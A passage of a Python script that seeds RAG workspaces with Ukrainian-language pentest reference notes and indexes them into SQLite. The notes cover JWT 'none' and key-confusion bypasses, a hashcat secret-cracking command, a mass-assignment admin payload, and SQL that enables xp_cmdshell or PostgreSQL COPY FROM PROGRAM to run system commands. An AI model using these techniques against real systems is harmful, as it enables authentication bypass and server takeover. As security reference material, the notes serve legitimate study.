tags: [web-security, jwt, cryptography, token-bypass]
status: reference
date: 2026-06-27
type: attack-vector
---

# Експлуатація вразливостей JSON Web Tokens (JWT)

**JWT** активно використовуються у веб-додатках та API для автентифікації користувачів. Неправильна реалізація перевірки сигнатур JWT дозволяє обійти автентифікацію.

## 1. Атака з алгоритмом "None"
Алгоритм `none` вказує, що токен не підписаний. Деякі вразливі бібліотеки JWT приймають такі токени, якщо вони надходять від клієнта.
* **Метод експлуатації**:
  Оригінальний заголовок JWT: `{"alg": "HS256", "typ": "JWT"}`.
  Атакуючий змінює його на: `{"alg": "none", "typ": "JWT"}`.
  Він змінює тіло токена (наприклад, `"username": "user"` на `"username": "admin"`) і прибирає підпис (залишаючи крапку в кінці токена).

## 2. Злом слабкого секретного ключа HMAC
Якщо JWT підписано алгоритмом HS256 (симетричне шифрування), секретний ключ може бути підібраний офлайн, якщо він є занадто простим.
* **Підбір ключа через Hashcat**:
  ```bash
  hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
  ```

## 3. Атака Key Confusion (Зміна алгоритму)
Якщо сервер очікує підпис асиметричним алгоритмом RS256 (використовує приватний ключ для підпису, публічний для перевірки), але бібліотека дозволяє приймати токени HS256, атакуючий може підписати токен публічним ключем сервера (який є загальнодоступним) за допомогою алгоритму HS256. Сервер спробує перевірити підпис, використовуючи свій публічний ключ як секрет для HMAC, і перевірка пройде успішно.

Див. також: [[owasp_top_10_methodology]] та [[api_documentation_leaks]].
""",
            "api_documentation_leaks.md": """---
tags: [web-security, api, swagger, information-disclosure]
status: reference
date: 2026-06-27
type: guide
---

# Виявлення прихованих API та витік документації

Сучасні веб-додатки будуються на базі REST API, GraphQL або gRPC. Витік документації API полегшує атаку на внутрішні функції додатку.

## 1. Пошук документації Swagger / OpenAPI
Розробники часто забувають вимикати інтерфейс Swagger у продакшн-середовищі. Це дозволяє атакуючому переглянути всі доступні маршрути, типи даних та спробувати надіслати тестові запити безпосередньо з браузера.
* **Типові шляхи пошуку**:
  * `/swagger-ui.html`
  * `/api/swagger.json`
  * `/v2/api-docs`
  * `/swagger/index.html`

## 2. Небезпечне масове присвоєння (Mass Assignment)
Виникає, коли фреймворк автоматично прив'язує параметри HTTP-запиту до полів моделі бази даних без явного визначення дозволених полів (White-listing).
* **Сценарій**:
  Реєстрація користувача приймає JSON: `{"username": "test", "password": "123"}`.
  Аналізуючи Swagger, атакуючий бачить, що модель користувача має поле `"is_admin"`.
  Він надсилає запит: `{"username": "test", "password": "123", "is_admin": true}` і реєструється як адміністратор.

## 3. Захист
* Вимикати Swagger-документацію в робочому середовищі (Production).
* Використовувати DTO (Data Transfer Objects) для фільтрації вхідних даних перед оновленням моделей бази даних.

Див. також: [[owasp_top_10_methodology]] та [[ssrf_internal_network]].
""",
            "database_exploitation.md": """---
tags: [web-security, database, post-exploitation, rce]
status: reference
date: 2026-06-27
type: guide
---

# Експлуатація баз даних та отримання віддаленого доступу (RCE)

Після виявлення SQL Injection (див. [[owasp_top_10_methodology]]) або компрометації облікових даних з [[credential_vault]], атакуючий може спробувати виконати системні команди на сервері бази даних.

## 1. Microsoft SQL Server (MSSQL)
В MSSQL є вбудована процедура `xp_cmdshell`, яка дозволяє виконувати команди в ОС Windows з правами облікового запису, під яким працює SQL Server.
* **Активація та запуск команд через SQL-запит**:
  ```sql
  -- Увімкнення розширених опцій
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  -- Активація xp_cmdshell
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  -- Виконання команди
  EXEC xp_cmdshell 'whoami';
  ```

## 2. PostgreSQL (Linux / Windows)
В PostgreSQL починаючи з версії 9.3 можна виконувати команди за допомогою оператора `COPY ... FROM PROGRAM`.
* **Виконання команд**:
  ```sql
  -- Створення тимчасової таблиці для виводу
  CREATE TABLE cmd_exec(cmd_output text);
  -- Виконання команди 'id' та запис результату в таблицю
  COPY cmd_exec FROM PROGRAM 'id';
  -- Перегляд результату
  SELECT * FROM cmd_exec;
  -- Видалення таблиці
  DROP TABLE cmd_exec;
  ```

## 3. Заходи захисту
* **Мінімальні привілеї**: Запускати процеси баз даних під обліковими записами з обмеженими правами (не від імені `Administrator` або `root`).
* **Вимкнення небезпечних функцій**: Переконатися, що розширення на кшталт `xp_cmdshell` вимкнені за замовчуванням.

Див. також: [[owasp_top_10_methodology]] та [[ssrf_internal_network]].
"""
        }
    }
}

# Base workspace path
workspaces_root = "workspaces"
os.makedirs(workspaces_root, exist_ok=True)

for ws_id, ws_info in workspaces_data.items():
    ws_path = os.path.join(workspaces_root, ws_id)
    vault_path = os.path.join(ws_path, "vault")
    raw_inputs_path = os.path.join(ws_path, "raw_inputs")
    archive_path = os.path.join(raw_inputs_path, ".archive")
    
    # Create directories
    os.makedirs(vault_path, exist_ok=True)
    os.makedirs(raw_inputs_path, exist_ok=True)
    os.makedirs(archive_path, exist_ok=True)
    
    # Write config.json
    config_data = {
        "provider": "local",
        "local_model_path": "models/Qwen2.5-3B-Instruct-Q4_K_M.gguf",
        "openai_api_key": "",
        "openai_base_url": "",
        "openai_model_name": "",
        "context_size": 8192,
        "rrf_threshold": 0.015
    }
    with open(os.path.join(ws_path, "config.json"), "w", encoding="utf-8") as f:
        json.dump(config_data, f, indent=4, ensure_ascii=False)
        
    print(f"Created workspace directories and config for: {ws_id}")
    
    # Write Markdown files
    for filename, content in ws_info["files"].items():
        filepath = os.path.join(vault_path, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"  Written file: {filename}")
        
    # Initialize SQLite database
    db_path = os.path.join(ws_path, "rag_storage.db")
    print(f"Initializing database: {db_path}")
    manager = RAGIndexManager(db_path=db_path)
    manager.init_db()
    
    # Process and Ingest files
    print(f"Ingesting vault files for workspace: {ws_id}")
    ingester = DocumentIngester(chunk_size=1000, chunk_overlap=200)
    result = ingester.process_directory(vault_path)
    
    # Insert data
    manager.insert_ingested_data(result)
    print(f"Workspace {ws_id} successfully populated and indexed! Chunks: {len(result['chunks'])}, Entities: {len(result['entities'])}")
    print("-" * 50)

print("All workspaces created, populated, and indexed successfully!")
